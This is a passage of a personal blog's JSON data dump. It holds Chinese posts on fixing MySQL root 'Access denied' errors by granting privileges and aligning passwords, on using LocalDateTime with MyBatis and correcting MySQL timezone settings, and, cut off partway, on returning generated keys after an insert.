  post\ntitle:      授权后连接MySQL依然被拒绝访问（Access denied for user 'root'@'localhost'）\nsubtitle:   那是真的牛逼。\ndate:       2019-03-09\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 后端\n    - Java\n    - 问题不大\n---\n\n我们在Spring Boot的应用配置中一般都会如下：\n\n```\njdbc:mysql://123.123.123.123:3306/db_name?useUnicode=true&characterEncoding=UTF-8&allowMultiQueries=true\n```\n123.123.123.123是MySQL数据库所在主机的IP地址，如果你想要远程访问数据库，就必须授权，一般这样操作：\n\n```\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '12345' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n```\n12345是你设置的访问密码。\n但有时候我们轻量应用服务都是单机的，根本不用远程访问，也就是说上面的配置我会这样写：\n\n```\njdbc:mysql://localhost:3306/byd?useUnicode=true&characterEncoding=UTF-8&allowMultiQueries=true\n```\n然后查看Tomcat日志发现Access denied for user 'root'@'localhost'，于是乎我们自然想到上面授权的%并不通配localhost，所以单独给localhost授权：\n\n```\nGRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'IDENTIFIED BY '12345' WITH GRANT OPTION;\nFLUSH PRIVILEGES;\n```\n一般到这应该没啥问题了，但我发现我的Web应用还是被拒绝访问，我有点慌了。马上去看mysql的user表：\n\n```sql\nSELECT user,host,password FROM mysql.user;\n```\n出现惊人一幕：\n\n| user | host | password |\n| ------ | ------ | ------ |\n| root | % | *xxxxxx |\n| root | 127.0.0.1 | *yyyyyy |\n| root | ::1 | *yyyyyy |\n| root | localhost | *xxxxxx |\n\n这里 *xxxxxx 和 *yyyyyy 只是做示范，总之情况就是我刚才给localhost设置的密码和127.0.0.1的密码不一样，这说明以前这个数据库给127.0.0.1单独授权过，所以导致localhost解析到本机地址后密码不对应，最终被拒绝访问。\n\n这里的解决办法就是把它们都设成一样的密码，就OK了：\n\n```sql\nUPDATE mysql.user SET password=PASSWORD('123456') WHERE user='root';\n```\n注意用PASSWORD()函数对密码进行加密，否则会变成明文。\n\n","slug":"授权后连接MySQL依然被拒绝访问（Access denied for user 'root'@'localhost'）","published":1,"updated":"2024-03-25T07:31:25.852Z","comments":1,"photos":[],"link":"","_id":"cluaufh0h000ithe6ee3g27p6","content":"<p>我们在Spring Boot的应用配置中一般都会如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdbc:mysql://123.123.123.123:3306/db_name?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=true</span><br></pre></td></tr></table></figure>\n<p>123.123.123.123是MySQL数据库所在主机的IP地址，如果你想要远程访问数据库，就必须授权，一般这样操作：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;IDENTIFIED BY &#x27;12345&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n<p>12345是你设置的访问密码。<br>但有时候我们轻量应用服务都是单机的，根本不用远程访问，也就是说上面的配置我会这样写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdbc:mysql://localhost:3306/byd?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=true</span><br></pre></td></tr></table></figure>\n<p>然后查看Tomcat日志发现Access denied for user ‘root‘@’localhost’，于是乎我们自然想到上面授权的%并不通配localhost，所以单独给localhost授权：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;localhost&#x27;IDENTIFIED BY &#x27;12345&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n<p>一般到这应该没啥问题了，但我发现我的Web应用还是被拒绝访问，我有点慌了。马上去看mysql的user表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">user</span>,host,password <span class=\"keyword\">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>\n<p>出现惊人一幕：</p>\n<table>\n<thead>\n<tr>\n<th>user</th>\n<th>host</th>\n<th>password</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>root</td>\n<td>%</td>\n<td>*xxxxxx</td>\n</tr>\n<tr>\n<td>root</td>\n<td>127.0.0.1</td>\n<td>*yyyyyy</td>\n</tr>\n<tr>\n<td>root</td>\n<td>::1</td>\n<td>*yyyyyy</td>\n</tr>\n<tr>\n<td>root</td>\n<td>localhost</td>\n<td>*xxxxxx</td>\n</tr>\n</tbody></table>\n<p>这里 *xxxxxx 和 *yyyyyy 只是做示范，总之情况就是我刚才给localhost设置的密码和127.0.0.1的密码不一样，这说明以前这个数据库给127.0.0.1单独授权过，所以导致localhost解析到本机地址后密码不对应，最终被拒绝访问。</p>\n<p>这里的解决办法就是把它们都设成一样的密码，就OK了：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> mysql.user <span class=\"keyword\">SET</span> password<span class=\"operator\">=</span>PASSWORD(<span class=\"string\">&#x27;123456&#x27;</span>) <span class=\"keyword\">WHERE</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>注意用PASSWORD()函数对密码进行加密，否则会变成明文。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>我们在Spring Boot的应用配置中一般都会如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdbc:mysql://123.123.123.123:3306/db_name?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=true</span><br></pre></td></tr></table></figure>\n<p>123.123.123.123是MySQL数据库所在主机的IP地址，如果你想要远程访问数据库，就必须授权，一般这样操作：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;IDENTIFIED BY &#x27;12345&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n<p>12345是你设置的访问密码。<br>但有时候我们轻量应用服务都是单机的，根本不用远程访问，也就是说上面的配置我会这样写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdbc:mysql://localhost:3306/byd?useUnicode=true&amp;characterEncoding=UTF-8&amp;allowMultiQueries=true</span><br></pre></td></tr></table></figure>\n<p>然后查看Tomcat日志发现Access denied for user ‘root‘@’localhost’，于是乎我们自然想到上面授权的%并不通配localhost，所以单独给localhost授权：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;localhost&#x27;IDENTIFIED BY &#x27;12345&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n<p>一般到这应该没啥问题了，但我发现我的Web应用还是被拒绝访问，我有点慌了。马上去看mysql的user表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">user</span>,host,password <span class=\"keyword\">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>\n<p>出现惊人一幕：</p>\n<table>\n<thead>\n<tr>\n<th>user</th>\n<th>host</th>\n<th>password</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>root</td>\n<td>%</td>\n<td>*xxxxxx</td>\n</tr>\n<tr>\n<td>root</td>\n<td>127.0.0.1</td>\n<td>*yyyyyy</td>\n</tr>\n<tr>\n<td>root</td>\n<td>::1</td>\n<td>*yyyyyy</td>\n</tr>\n<tr>\n<td>root</td>\n<td>localhost</td>\n<td>*xxxxxx</td>\n</tr>\n</tbody></table>\n<p>这里 *xxxxxx 和 *yyyyyy 只是做示范，总之情况就是我刚才给localhost设置的密码和127.0.0.1的密码不一样，这说明以前这个数据库给127.0.0.1单独授权过，所以导致localhost解析到本机地址后密码不对应，最终被拒绝访问。</p>\n<p>这里的解决办法就是把它们都设成一样的密码，就OK了：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> mysql.user <span class=\"keyword\">SET</span> password<span class=\"operator\">=</span>PASSWORD(<span class=\"string\">&#x27;123456&#x27;</span>) <span class=\"keyword\">WHERE</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>注意用PASSWORD()函数对密码进行加密，否则会变成明文。</p>\n"},{"layout":"post","title":"MyBatis直接使用LocalDateTime时间类型以及MySQL时区问题排错","subtitle":"那是真的牛逼。","date":"2019-03-14T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 时间类型\n\nJava 8提供了新的时间API，相关介绍大家可以自行搜索或者直接参考这篇[Java中的时间与时区](https://blog.csdn.net/u012107143/article/details/78790378)，因此大家在写实体类时，可以放弃用以前的Date或者Timestamp类型了，直接用LocalDateTime类就行了，MyBatis从3.4.5版本开始就完全支持这种类型了，根本不用自己再去写什么类型转换，目前网上搜到的大部分文章还是让我们自己去实现，其实不用的。\n\n我们来看看其官方文档（ https://github.com/mybatis/mybatis-3/releases ）：\n\n> mybatis-3.4.5\n@harawata harawata released this on 20 Aug 2017 · 472 commits to master since this release\nEnhancements:\nMake default enum type handler customizable. #971\nMake mapper method and its interface type accessible to SqlProvider. #1055\nAllow using configuration properties in SqlProvider. #1061\n**Merge type handlers for JSR-310 (Java Date and Time API) into the core. #974**\n\nJSR-310相关规范在这个版本就已经支持了，所以大家只要不小于此版本的就放心用吧。举个例子：\n\n```java\npublic class User {\n    private LocalDateTime createTime;\n    // setter ... getter ... 省略了哈\n}\n\npublic interface UserDao {\n    @Insert(\"INSERT INTO user(create_time) values(#{createTime})\")\n    int insertUser(User user);\n}\n\n// 在set时间时，一般直接用now方法就好\nuser.setCreateTime(LocalDateTime.now());\n```\n这样就OK了，如果你数据库表存的是datetime类型的话，MyBatis自动帮你解析转换，你不用做额外工作。\n\n**注意：**\n这里LocalDateTime默认是不包含时区信息的，会取当前机器时间的时区，其实一般情况下，是没有问题的，我用阿里云的服务器（在深圳），直接打印出来就是：\n\n```java\nSystem.out.println(LocalDateTime.now());\n// 输出的是北京时间\n2019-03-15T16:51:37.121\n```\n当然这样可能你不是很放心，那么就指明时区：\n\n```java\nSystem.out.println(LocalDateTime.now(ZoneId.of(\"+08:00\")));\n```\n\n## MySQL时区有问题（相差13或14小时）\n这个问题最开始让我非常头疼，明明我的Tomcat和MySQL在同一个服务器上，Java代码打印时间出来都是对的，结果一插入数据库时间就错了。\n然后进入数据库查看时间和时区：\n\n```shell\nmysql> select curtime();\nmysql> show variables like '%time_zone%';\n```\n发现时间也没问题，都是北京时间，那为什么通过JDBC一插就差那么十几个小时呢？\n问题的原因在这里：[一次 JDBC 与 MySQL 因 “CST” 时区协商误解导致时间差了 14 或 13 小时的排错经历](https://juejin.im/post/5902e087da2f60005df05c3d)\n\n**解决办法：**\n手动修改MySQL的时区，明确指定：\n\n```shell\nmysql> set global time_zone='+08:00';\nmysql> set time_zone='+08:00';\nmysql> flush privileges;\n```\n或者修改my.cnf配置文件，一劳永逸，添加：\n\n```\n[mysqld]\ndefault-time-zone = '+08:00'\n```\n即可，最后记得重启MySQL服务，最好还能重启一下Tomcat。\n","source":"_posts/2019-03-15-MyBatis直接使用LocalDateTime时间类型以及MySQL时区问题排错.md","raw":"---\nlayout:     post\ntitle:      MyBatis直接使用LocalDateTime时间类型以及MySQL时区问题排错\nsubtitle:   那是真的牛逼。\ndate:       2019-03-15\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 后端\n    - Java\n    - 问题不大\n---\n\n## 时间类型\n\nJava 8提供了新的时间API，相关介绍大家可以自行搜索或者直接参考这篇[Java中的时间与时区](https://blog.csdn.net/u012107143/article/details/78790378)，因此大家在写实体类时，可以放弃用以前的Date或者Timestamp类型了，直接用LocalDateTime类就行了，MyBatis从3.4.5版本开始就完全支持这种类型了，根本不用自己再去写什么类型转换，目前网上搜到的大部分文章还是让我们自己去实现，其实不用的。\n\n我们来看看其官方文档（ https://github.com/mybatis/mybatis-3/releases ）：\n\n> mybatis-3.4.5\n@harawata harawata released this on 20 Aug 2017 · 472 commits to master since this release\nEnhancements:\nMake default enum type handler customizable. #971\nMake mapper method and its interface type accessible to SqlProvider. #1055\nAllow using configuration properties in SqlProvider. #1061\n**Merge type handlers for JSR-310 (Java Date and Time API) into the core. #974**\n\nJSR-310相关规范在这个版本就已经支持了，所以大家只要不小于此版本的就放心用吧。举个例子：\n\n```java\npublic class User {\n    private LocalDateTime createTime;\n    // setter ... getter ... 省略了哈\n}\n\npublic interface UserDao {\n    @Insert(\"INSERT INTO user(create_time) values(#{createTime})\")\n    int insertUser(User user);\n}\n\n// 在set时间时，一般直接用now方法就好\nuser.setCreateTime(LocalDateTime.now());\n```\n这样就OK了，如果你数据库表存的是datetime类型的话，MyBatis自动帮你解析转换，你不用做额外工作。\n\n**注意：**\n这里LocalDateTime默认是不包含时区信息的，会取当前机器时间的时区，其实一般情况下，是没有问题的，我用阿里云的服务器（在深圳），直接打印出来就是：\n\n```java\nSystem.out.println(LocalDateTime.now());\n// 输出的是北京时间\n2019-03-15T16:51:37.121\n```\n当然这样可能你不是很放心，那么就指明时区：\n\n```java\nSystem.out.println(LocalDateTime.now(ZoneId.of(\"+08:00\")));\n```\n\n## MySQL时区有问题（相差13或14小时）\n这个问题最开始让我非常头疼，明明我的Tomcat和MySQL在同一个服务器上，Java代码打印时间出来都是对的，结果一插入数据库时间就错了。\n然后进入数据库查看时间和时区：\n\n```shell\nmysql> select curtime();\nmysql> show variables like '%time_zone%';\n```\n发现时间也没问题，都是北京时间，那为什么通过JDBC一插就差那么十几个小时呢？\n问题的原因在这里：[一次 JDBC 与 MySQL 因 “CST” 时区协商误解导致时间差了 14 或 13 小时的排错经历](https://juejin.im/post/5902e087da2f60005df05c3d)\n\n**解决办法：**\n手动修改MySQL的时区，明确指定：\n\n```shell\nmysql> set global time_zone='+08:00';\nmysql> set time_zone='+08:00';\nmysql> flush privileges;\n```\n或者修改my.cnf配置文件，一劳永逸，添加：\n\n```\n[mysqld]\ndefault-time-zone = '+08:00'\n```\n即可，最后记得重启MySQL服务，最好还能重启一下Tomcat。\n","slug":"MyBatis直接使用LocalDateTime时间类型以及MySQL时区问题排错","published":1,"updated":"2024-03-25T07:31:25.852Z","comments":1,"photos":[],"link":"","_id":"cluaufh0h000kthe6gapscg8m","content":"<h2 id=\"时间类型\"><a href=\"#时间类型\" class=\"headerlink\" title=\"时间类型\"></a>时间类型</h2><p>Java 8提供了新的时间API，相关介绍大家可以自行搜索或者直接参考这篇<a href=\"https://blog.csdn.net/u012107143/article/details/78790378\">Java中的时间与时区</a>，因此大家在写实体类时，可以放弃用以前的Date或者Timestamp类型了，直接用LocalDateTime类就行了，MyBatis从3.4.5版本开始就完全支持这种类型了，根本不用自己再去写什么类型转换，目前网上搜到的大部分文章还是让我们自己去实现，其实不用的。</p>\n<p>我们来看看其官方文档（ <a href=\"https://github.com/mybatis/mybatis-3/releases\">https://github.com/mybatis/mybatis-3/releases</a> ）：</p>\n<blockquote>\n<p>mybatis-3.4.5<br>@harawata harawata released this on 20 Aug 2017 · 472 commits to master since this release<br>Enhancements:<br>Make default enum type handler customizable. #971<br>Make mapper method and its interface type accessible to SqlProvider. #1055<br>Allow using configuration properties in SqlProvider. #1061<br><strong>Merge type handlers for JSR-310 (Java Date and Time API) into the core. #974</strong></p>\n</blockquote>\n<p>JSR-310相关规范在这个版本就已经支持了，所以大家只要不小于此版本的就放心用吧。举个例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">User</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> LocalDateTime createTime;</span><br><span class=\"line\">    <span class=\"comment\">// setter ... getter ... 省略了哈</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">UserDao</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Insert(&quot;INSERT INTO user(create_time) values(#&#123;createTime&#125;)&quot;)</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">insertUser</span><span class=\"params\">(User user)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在set时间时，一般直接用now方法就好</span></span><br><span class=\"line\">user.setCreateTime(LocalDateTime.now());</span><br></pre></td></tr></table></figure>\n<p>这样就OK了，如果你数据库表存的是datetime类型的话，MyBatis自动帮你解析转换，你不用做额外工作。</p>\n<p><strong>注意：</strong><br>这里LocalDateTime默认是不包含时区信息的，会取当前机器时间的时区，其实一般情况下，是没有问题的，我用阿里云的服务器（在深圳），直接打印出来就是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(LocalDateTime.now());</span><br><span class=\"line\"><span class=\"comment\">// 输出的是北京时间</span></span><br><span class=\"line\"><span class=\"number\">2019</span>-<span class=\"number\">03</span>-15T16:<span class=\"number\">51</span>:<span class=\"number\">37.121</span></span><br></pre></td></tr></table></figure>\n<p>当然这样可能你不是很放心，那么就指明时区：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(LocalDateTime.now(ZoneId.of(<span class=\"string\">&quot;+08:00&quot;</span>)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MySQL时区有问题（相差13或14小时）\"><a href=\"#MySQL时区有问题（相差13或14小时）\" class=\"headerlink\" title=\"MySQL时区有问题（相差13或14小时）\"></a>MySQL时区有问题（相差13或14小时）</h2><p>这个问题最开始让我非常头疼，明明我的Tomcat和MySQL在同一个服务器上，Java代码打印时间出来都是对的，结果一插入数据库时间就错了。<br>然后进入数据库查看时间和时区：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"keyword\">select</span> curtime();</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\">show variables like <span class=\"string\">&#x27;%time_zone%&#x27;</span>;</span></span><br></pre></td></tr></table></figure>\n<p>发现时间也没问题，都是北京时间，那为什么通过JDBC一插就差那么十几个小时呢？<br>问题的原因在这里：<a href=\"https://juejin.im/post/5902e087da2f60005df05c3d\">一次 JDBC 与 MySQL 因 “CST” 时区协商误解导致时间差了 14 或 13 小时的排错经历</a></p>\n<p><strong>解决办法：</strong><br>手动修改MySQL的时区，明确指定：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"built_in\">set</span> global time_zone=<span class=\"string\">&#x27;+08:00&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"built_in\">set</span> time_zone=<span class=\"string\">&#x27;+08:00&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\">flush privileges;</span></span><br></pre></td></tr></table></figure>\n<p>或者修改my.cnf配置文件，一劳永逸，添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">default-time-zone = &#x27;+08:00&#x27;</span><br></pre></td></tr></table></figure>\n<p>即可，最后记得重启MySQL服务，最好还能重启一下Tomcat。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"时间类型\"><a href=\"#时间类型\" class=\"headerlink\" title=\"时间类型\"></a>时间类型</h2><p>Java 8提供了新的时间API，相关介绍大家可以自行搜索或者直接参考这篇<a href=\"https://blog.csdn.net/u012107143/article/details/78790378\">Java中的时间与时区</a>，因此大家在写实体类时，可以放弃用以前的Date或者Timestamp类型了，直接用LocalDateTime类就行了，MyBatis从3.4.5版本开始就完全支持这种类型了，根本不用自己再去写什么类型转换，目前网上搜到的大部分文章还是让我们自己去实现，其实不用的。</p>\n<p>我们来看看其官方文档（ <a href=\"https://github.com/mybatis/mybatis-3/releases\">https://github.com/mybatis/mybatis-3/releases</a> ）：</p>\n<blockquote>\n<p>mybatis-3.4.5<br>@harawata harawata released this on 20 Aug 2017 · 472 commits to master since this release<br>Enhancements:<br>Make default enum type handler customizable. #971<br>Make mapper method and its interface type accessible to SqlProvider. #1055<br>Allow using configuration properties in SqlProvider. #1061<br><strong>Merge type handlers for JSR-310 (Java Date and Time API) into the core. #974</strong></p>\n</blockquote>\n<p>JSR-310相关规范在这个版本就已经支持了，所以大家只要不小于此版本的就放心用吧。举个例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">User</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> LocalDateTime createTime;</span><br><span class=\"line\">    <span class=\"comment\">// setter ... getter ... 省略了哈</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">UserDao</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Insert(&quot;INSERT INTO user(create_time) values(#&#123;createTime&#125;)&quot;)</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">insertUser</span><span class=\"params\">(User user)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在set时间时，一般直接用now方法就好</span></span><br><span class=\"line\">user.setCreateTime(LocalDateTime.now());</span><br></pre></td></tr></table></figure>\n<p>这样就OK了，如果你数据库表存的是datetime类型的话，MyBatis自动帮你解析转换，你不用做额外工作。</p>\n<p><strong>注意：</strong><br>这里LocalDateTime默认是不包含时区信息的，会取当前机器时间的时区，其实一般情况下，是没有问题的，我用阿里云的服务器（在深圳），直接打印出来就是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(LocalDateTime.now());</span><br><span class=\"line\"><span class=\"comment\">// 输出的是北京时间</span></span><br><span class=\"line\"><span class=\"number\">2019</span>-<span class=\"number\">03</span>-15T16:<span class=\"number\">51</span>:<span class=\"number\">37.121</span></span><br></pre></td></tr></table></figure>\n<p>当然这样可能你不是很放心，那么就指明时区：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(LocalDateTime.now(ZoneId.of(<span class=\"string\">&quot;+08:00&quot;</span>)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MySQL时区有问题（相差13或14小时）\"><a href=\"#MySQL时区有问题（相差13或14小时）\" class=\"headerlink\" title=\"MySQL时区有问题（相差13或14小时）\"></a>MySQL时区有问题（相差13或14小时）</h2><p>这个问题最开始让我非常头疼，明明我的Tomcat和MySQL在同一个服务器上，Java代码打印时间出来都是对的，结果一插入数据库时间就错了。<br>然后进入数据库查看时间和时区：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"keyword\">select</span> curtime();</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\">show variables like <span class=\"string\">&#x27;%time_zone%&#x27;</span>;</span></span><br></pre></td></tr></table></figure>\n<p>发现时间也没问题，都是北京时间，那为什么通过JDBC一插就差那么十几个小时呢？<br>问题的原因在这里：<a href=\"https://juejin.im/post/5902e087da2f60005df05c3d\">一次 JDBC 与 MySQL 因 “CST” 时区协商误解导致时间差了 14 或 13 小时的排错经历</a></p>\n<p><strong>解决办法：</strong><br>手动修改MySQL的时区，明确指定：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"built_in\">set</span> global time_zone=<span class=\"string\">&#x27;+08:00&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\"><span class=\"built_in\">set</span> time_zone=<span class=\"string\">&#x27;+08:00&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">mysql&gt; </span><span class=\"language-bash\">flush privileges;</span></span><br></pre></td></tr></table></figure>\n<p>或者修改my.cnf配置文件，一劳永逸，添加：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">default-time-zone = &#x27;+08:00&#x27;</span><br></pre></td></tr></table></figure>\n<p>即可，最后记得重启MySQL服务，最好还能重启一下Tomcat。</p>\n"},{"layout":"post","title":"MyBatis中插入（insert）后返回主键（key）的注解方式","subtitle":"那是真的牛逼。","date":"2019-03-16T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n一般我们插入数据后需要知道其自增的主键key是多少，有两种方式：\n#### 用@Options注解：\n比如这里有个订单（Order）相关的DAO：\n\n```java\npublic interface OrderDao {\n    @Insert(\"INSERT INTO ...\")\n    @Options(useGeneratedKeys = true, keyProperty = \"id\", keyColumn = \"id\")\n   